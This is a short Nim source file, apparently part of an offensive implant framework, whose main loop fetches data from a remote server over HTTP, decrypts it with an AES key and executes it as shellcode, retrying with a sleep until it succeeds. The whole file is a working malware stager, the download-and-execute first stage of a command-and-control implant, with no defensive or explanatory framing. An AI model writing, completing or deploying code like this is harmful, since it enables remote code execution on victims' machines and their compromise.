import ../utils/global
import ../capabilities/sleep/core
import ../utils/stage
import ../utils/crypt/transport
import ../utils/network/http as nhttp

proc toBytes(body: string): seq[byte] =
  # Copies the body string into a byte sequence
  result = newSeq[byte](body.len)
  if body.len > 0:
    copyMem(addr result[0], addr body[0], body.len)

proc payloadFromResponse(raw: string): seq[byte] =
  # Tries to decrypt the response then returns it as bytes
  var text = tryCryptDecrypt(aesKey, raw)
  if text.len == 0 and raw.len > 0:
    text = raw
  toBytes(text)

proc main*(): void =
  # Main loop that fetches a payload and runs the shellcode
  while true:
    let resp = nhttp.httpGetRaw()
    if resp.ok and resp.code == 200 and resp.body.len > 0:
      let payload = payloadFromResponse(resp.body)
      if payload.len > 0:
        runShellcode(payload)
        return
    sleep_now()
